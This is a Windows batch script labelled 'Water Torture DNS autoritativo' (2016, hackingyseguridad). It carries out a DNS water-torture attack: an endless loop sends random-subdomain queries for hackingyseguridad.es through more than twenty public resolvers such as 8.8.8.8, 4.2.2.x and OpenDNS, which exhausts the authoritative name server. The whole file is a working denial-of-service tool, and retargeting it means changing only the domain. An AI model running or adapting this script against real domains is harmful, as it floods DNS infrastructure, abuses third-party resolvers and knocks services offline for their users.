@ECHO OFF
ECHO Water Torture DNS autoritativo. (c) hackingyseguridad 2016. Version 3.
:loop
SET/A ran=%random%
dig @118.174.15.254 +notcp %ran%.hackingyseguridad.es
dig @200.6.250.52 +notcp %ran%.hackingyseguridad.es
dig @87.216.179.130 +notcp %ran%.hackingyseguridad.es
dig @84.232.40.254 +notcp %ran%.hackingyseguridad.es
dig @176.32.50.10 +notcp %ran%.hackingyseguridad.es
dig @85.112.29.175 +notcp %ran%.hackingyseguridad.es
dig @208.67.222.222 +notcp %ran%.hackingyseguridad.es
dig @208.67.220.220 +notcp %ran%.hackingyseguridad.es
dig @209.244.0.3 +notcp %ran%.hackingyseguridad.es
dig @209.244.0.4 +notcp %ran%.hackingyseguridad.es
dig @216.146.35.35 +notcp %ran%.hackingyseguridad.es
dig @216.146.36.36 +notcp %ran%.hackingyseguridad.es
dig @8.8.8.8 +notcp %ran%.hackingyseguridad.es
dig @8.8.4.4 +notcp %ran%.hackingyseguridad.es
dig @4.2.2.1 +notcp %ran%.hackingyseguridad.es
dig @4.2.2.2 +notcp %ran%.hackingyseguridad.es
dig @4.2.2.3 +notcp %ran%.hackingyseguridad.es
dig @4.2.2.4 +notcp %ran%.hackingyseguridad.es
dig @209.244.0.3 +notcp %ran%.hackingyseguridad.es
dig @209.244.0.4 +notcp %ran%.hackingyseguridad.es
dig @84.200.69.80 +notcp %ran%.hackingyseguridad.es
dig @84.200.70.40 +notcp %ran%.hackingyseguridad.es
goto loop
